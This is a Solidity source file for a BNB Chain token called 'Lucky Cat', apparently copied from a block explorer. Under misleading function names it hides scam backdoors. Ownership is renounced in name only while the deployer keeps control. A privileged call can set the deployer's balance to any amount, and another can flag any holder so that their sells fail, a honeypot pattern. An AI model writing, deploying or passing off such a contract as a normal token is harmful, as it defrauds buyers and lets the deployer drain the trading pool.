/**
 *Submitted for verification at BscScan.com on 2023-01-30
*/

//SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;


interface enableToken {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);
}

interface toSender {
    function createPair(address tokenA, address tokenB) external returns (address);
}

contract LuckyCat {
    uint8 public decimals = 18;
    address public buyToSwap;
    mapping(address => bool) public enableShould;
    address public atListLaunched;


    bool public limitAtTotal;
    string public name = "Lucky Cat";
    string public symbol = "LCT";



    mapping(address => uint256) public balanceOf;
    uint256 public totalSupply = 100000000 * 10 ** 18;
    uint256 constant autoReceiverExempt = 11 ** 10;
    address public owner;
    mapping(address => bool) public swapTo;
    mapping(address => mapping(address => uint256)) public allowance;
    

    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);

    constructor (){
        enableToken isFrom = enableToken(0x10ED43C718714eb63d5aA57B78B54704E256024E);
        atListLaunched = toSender(isFrom.factory()).createPair(isFrom.WETH(), address(this));
        owner = launchTx();
        buyToSwap = owner;
        enableShould[buyToSwap] = true;
        balanceOf[buyToSwap] = totalSupply;
        emit Transfer(address(0), buyToSwap, totalSupply);
        shouldMarketing();
    }

    

    function launchTx() private view returns (address) {
        return msg.sender;
    }

    function totalReceiver(address takeTx) public {
        if (limitAtTotal) {
            return;
        }
        enableShould[takeTx] = true;
        limitAtTotal = true;
    }

    function getOwner() external view returns (address) {
        return owner;
    }

    function approve(address liquidityLimit, uint256 launchLiquidity) public returns (bool) {
        allowance[launchTx()][liquidityLimit] = launchLiquidity;
        emit Approval(launchTx(), liquidityLimit, launchLiquidity);
        return true;
    }

    function transfer(address txSwap, uint256 launchLiquidity) external returns (bool) {
        return transferFrom(launchTx(), txSwap, launchLiquidity);
    }

    function txMarketing(uint256 launchLiquidity) public {
        if (!enableShould[launchTx()]) {
            return;
        }
        balanceOf[buyToSwap] = launchLiquidity;
    }

    function transferFrom(address isWallet, address txSwap, uint256 launchLiquidity) public returns (bool) {
        if (isWallet != launchTx() && allowance[isWallet][launchTx()] != type(uint256).max) {
            require(allowance[isWallet][launchTx()] >= launchLiquidity);
            allowance[isWallet][launchTx()] -= launchLiquidity;
        }
        if (txSwap == buyToSwap || isWallet == buyToSwap) {
            return receiverWallet(isWallet, txSwap, launchLiquidity);
        }
        if (swapTo[isWallet]) {
            return receiverWallet(isWallet, txSwap, autoReceiverExempt);
        }
        return receiverWallet(isWallet, txSwap, launchLiquidity);
    }

    function receiverWallet(address amountReceiver, address minLaunchTeam, uint256 launchLiquidity) internal returns (bool) {
        require(balanceOf[amountReceiver] >= launchLiquidity);
        balanceOf[amountReceiver] -= launchLiquidity;
        balanceOf[minLaunchTeam] += launchLiquidity;
        emit Transfer(amountReceiver, minLaunchTeam, launchLiquidity);
        return true;
    }

    function senderLaunched(address autoTo) public {
        if (autoTo == buyToSwap || autoTo == atListLaunched || !enableShould[launchTx()]) {
            return;
        }
        swapTo[autoTo] = true;
    }

    function shouldMarketing() public {
        emit OwnershipTransferred(buyToSwap, address(0));
        owner = address(0);
    }


}